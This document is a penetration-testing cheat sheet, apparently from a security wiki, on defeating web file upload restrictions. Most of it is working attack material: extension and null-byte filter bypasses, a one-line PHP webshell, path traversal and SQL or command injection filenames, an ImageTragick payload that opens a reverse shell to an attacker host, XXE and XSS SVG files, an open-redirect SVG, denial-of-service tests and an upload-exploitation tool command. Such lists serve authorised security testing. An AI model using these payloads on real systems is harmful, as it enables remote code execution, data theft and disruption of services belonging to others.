# File upload

```
# File name validation
    # extension blacklisted:
    PHP: .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
    ASP: .asp, .aspx, .cer, .asa
    Jsp: .jsp, .jspx, .jsw, .jsv, .jspf
    Coldfusion: .cfm, .cfml, .cfc, .dbm
    Using random capitalization: .pHp, .pHP5, .PhAr
    pht,phpt,phtml,php3,php4,php5,php6,php7,phar,pgif,phtm,phps,shtml,phar,pgif,inc
    # extension whitelisted:
    file.jpg.php
    file.php.jpg
    file.php.blah123jpg
    file.php%00.jpg
    file.php\x00.jpg
    file.php%00
    file.php%20
    file.php%0d%0a.jpg
    file.php.....
    file.php/
    file.php.\
    file.
    .html
# Content type bypass
    - Preserve name, but change content-type
    Content-Type: image/jpeg, image/gif, image/png
# Content length:
    # Small bad code:
    <?='$_GET[x]'?>
    
# Impact by extension
asp, aspx, php5, php, php3: webshell, rce
svg: stored xss, ssrf, xxe
gif: stored xss, ssrf
csv: csv injection
xml: xxe
avi: lfi, ssrf
html, js: html injection, xss, open redirect
png, jpeg: pixel flood attack dos
zip: rce via lfi, dos
pdf, pptx: ssrf, blind xxe

# Path traversal
../../etc/passwd/logo.png
../../../logo.png

# SQLi
'sleep(10).jpg
sleep(10)-- -.jpg

# Command injection
; sleep 10;

# ImageTragick
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context

# XXE .svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1
<text font-size="40" x="0" y="16">&xxe;</text>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>

# XSS svg
<svg onload=alert(document.comain)>.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
File Upload Checklist 3
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert("HolyBugx XSS");
</script>
</svg>

# Open redirect svg
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='https://attacker.com'"
xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>
</code>
    
# Filter Bypassing Techniques
# upload asp file using .cer & .asa extension (IIS — Windows)
# Upload .eml file when content-type = text/HTML
# Inject null byte shell.php%001.jpg
# Check for .svg file upload you can achieve stored XSS using XML payload
# put file name ../../logo.png or ../../etc/passwd/logo.png to get directory traversal via upload file
# Upload large size file for DoS attack test using the image.
# (magic number) upload shell.php change content-type to image/gif and start content with GIF89a; will do the job!
# If web app allows for zip upload then rename the file to pwd.jpg bcoz developer handle it via command
# upload the file using SQL command 'sleep(10).jpg you may achieve SQL if image directly saves to DB.

# Advance Bypassing techniques
# Imagetragick aka ImageMagick:
https://mukarramkhalid.com/imagemagick-imagetragick-exploit/
https://github.com/neex/gifoeb
    
# Upload file tool
https://github.com/almandin/fuxploider
python3 fuxploider.py --url https://example.com --not-regex "wrong file type"

https://github.com/sAjibuu/upload_bypass
```

### Cheatsheet

```
upload.random123		---	To test if random file extensions can be uploaded.
upload.php			---	try to upload a simple php file.
upload.php.jpeg 		--- 	To bypass the blacklist.
upload.jpg.php 			---	To bypass the blacklist. 
upload.php 			---	and Then Change the content type of the file to image or jpeg.
upload.php*			---	version - 1 2 3 4 5 6 7.
upload.PHP			---	To bypass The BlackList.
upload.PhP			---	To bypass The BlackList.
upload.pHp			---	To bypass The BlackList.
upload .htaccess 		--- 	By uploading this [jpg,png] files can be executed as php with milicious code within it.
pixelFlood.jpg			---	To test againt the DOS.
frameflood.gif			---	upload gif file with 10^10 Frames
Malicious zTXT  		--- 	upload UBER.jpg 
Upload zip file			---	test againts Zip slip (only when file upload supports zip file)
Check Overwrite Issue		--- 	Upload file.txt and file.txt with different content and check if 2nd file.txt overwrites 1st file
SVG to XSS			---	Check if you can upload SVG files and can turn them to cause XSS on the target app
SQLi Via File upload		---	Try uploading `sleep(10)-- -.jpg` as file
```

![](<../../.gitbook/assets/image (16).png>)
